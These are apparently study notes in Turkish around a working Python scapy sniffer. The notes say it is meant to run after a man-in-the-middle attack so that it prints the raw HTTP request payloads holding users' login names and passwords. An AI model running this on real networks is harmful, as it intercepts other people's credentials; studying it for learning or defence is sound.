import scapy.all as scapy
from scapy_http import http
 
                   ***Herhangi bir şey olduğunda nasıl devam edeceğimizi callback functionlar ile yazarız. 
                    callback function: Paketler geldikçe bana paket şeklinde input alıp yolluyor.
                                       Paketi bir yere yollayacağım nereye, hangi fonksiyonuna yollayayım?
                                       Paketleri işleyeceğimiz fonksiyonu yazmamız gerekiyor.
                                       Her paket geldiğinde ben o fonksiyonun içine paketi input olarak alabileyim. 
def listen_packets(interface):                |
   scapy.sniff(iface=interface, store=False, prn=analyze_packets)           ***Filtre koyabiliriz.
                                  |                                            Sadece port80'den gelenleri göster gibi.
                 Aldığım paketleri hafızaya kaydetme.
                 True yaparsan kaydeder ama bilgisayarı çok yorar.
                 Kaydetmiyoruz, geldikçe işleyeceğiz.

    ***---> sniff: mitm jargonunda gelen paketlerin hepsini dinlemek ve onları kendimize çekmek.
                 Dinledikten sonra nasıl işleyeceğimiz konusu scapy_http kısmında.

         packet'i sniff fonksiyonu yollayacak.
                      |
def analyze_packets(packet):
   packet.show()

listen_packets("eth0")

|
|
|
Önce mitm atağını başlatıp sonra bunu başlatırsan verileri alırsın.
Wireshark'ta olduğu gibi paketler görürsün.
HTTP'NİN ALTINDA RAW, RAW'UN ALTINDA load'A EŞİTLENMİŞ KULLANICI ADI VE ŞİFRE GÖRÜRSÜN.
Benim HTTP paketlerini almam lazım, altında RAW diye bir yeri almam lazım, onun içinde load var onu almam lazım.
scapy RAW, ETHERNET, HTTP... bunların hepsini bir katman olarak bulunduruyor. Biz de bu katmanlarda tek tek aşağıya inebiliyoruz.








DÜZENLEME
---------
import scapy.all as scapy
from scapy_http import http

def listen_packets(interface):                
   scapy.sniff(iface=interface, store=False, prn=analyze_packets)

def analyze_packets(packet):
   if packet.haslayer(http.HTTPRequest):
      if packet.haslayer(scapy.Raw):
         print(packet[scapy.Raw].load)

listen_packets("eth0")